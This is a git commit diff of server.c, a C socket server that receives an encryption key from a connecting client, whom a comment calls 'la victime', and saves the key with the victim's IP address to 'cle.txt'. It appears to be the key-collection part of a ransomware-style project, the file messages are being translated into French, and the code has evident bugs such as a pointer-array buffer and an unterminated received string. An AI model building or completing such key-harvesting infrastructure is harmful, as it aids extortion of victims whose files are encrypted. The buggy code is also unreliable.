7790b38ea180fd7998a54f31b077079ab5e195b4
kitsensas <83115131+humag18@users.noreply.github.com>
2023-01-02 11:32:54 -0500

    reception + stockage

--- server.c
+++ server.c
@@ -6,7 +6,7 @@
 #include <netinet/in.h>
 #include <stdlib.h>
 #include <netdb.h>
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 97
 
 void handle_error(){
     printf("Error\n");
@@ -18,76 +18,67 @@ int main(void) {
     int server_port = 8888;
     char *server_ip = "127.0.0.1";
     sockid = socket(AF_INET, SOCK_STREAM, 0);
+    
 
     struct sockaddr_in server_addr, client_addr;
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(server_port);
     server_addr.sin_addr.s_addr = INADDR_ANY;
+    //création du socket
+
 
     char *buffer[BUFFER_SIZE];
     int n, client_socket;
     int bind_result = bind(sockid, (const struct sockaddr *) &server_addr, sizeof(server_addr));
 
     if (bind_result < 0) {
-        printf("Error during binding");
+        printf("Erreur lors du bond");
     } 
     else {
-        printf("server listening");
+        printf("Écoute \n");
         n = listen(sockid, 1);
         if (n < 0) {
-            printf("Error during listen()\n");
+            printf("Erreur lors de l'écoute()\n");
             handle_error();
         }
         int len = sizeof(client_addr);
         client_socket = accept(sockid, (struct sockaddr *) &client_addr, &len);
 
         if (client_socket < 0) {
-            printf("Error during accept");
+            printf("Erreur lors de la connection");
             handle_error();
         }
-        printf("Accept connection from %s\n",
+        printf("connection venant de %s acceptée\n",
                inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
         n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
         
     }
-    char *key_iv = (char *) buffer;
-    char *key = (char *) key_iv[0,31];
-    char *iv = "(char  *) buffer2";
+    char *key = (char *)buffer;
     char *new_ip = inet_ntoa(client_addr.sin_addr);
     
     close(sockid);
-
-    FILE *file = fopen("cle", "w");
+    
+    FILE *file = fopen("cle.txt", "w");
     if (file == NULL) {
         // Erreur lors de l'ouverture du fichier
-        printf("Error opening file!\n");
+        printf("Erreur lors de l'ouverture de fichier!\n");
         return 1;
     }
 
     // Écrit la clé AES 256 bits et l'IV 128 bits dans le fichier
     if (fputs((char*)key, file) == EOF) {
         // Erreur lors de l'écriture de la clé dans le fichier
-        printf("Error writing key to file!\n");
+        printf("Erreur lors de l'écriture de la clé!\n");
         return 1;
     }
     if (fputs("\n", file) == EOF) {
         // Erreur lors de l'écriture du retour à la ligne
-        printf("Error writing newline to file!\n");
-        return 1;
-    }
-    if (fputs((char*)iv, file) == EOF) {
-        // Erreur lors de l'écriture de l'IV dans le fichier
-        printf("Error writing IV to file!\n");
-        return 1;
-    }
-    if (fputs("\n", file) == EOF) {
-        // Erreur lors de l'écriture du retour à la ligne
-        printf("Error writing newline to file!\n");
+        printf("Erreur lors de l'écriture dans le fichier!\n");
         return 1;
     }
     if (fputs((char*)new_ip, file) == EOF) {
         // Erreur lors de l'écriture de l'IV dans le fichier
-        printf("Error writing IV to file!\n");
+        printf("Erreur lors de l'écriture de l'adresse!\n");
         return 1;
     }
     // Ferme le fichier
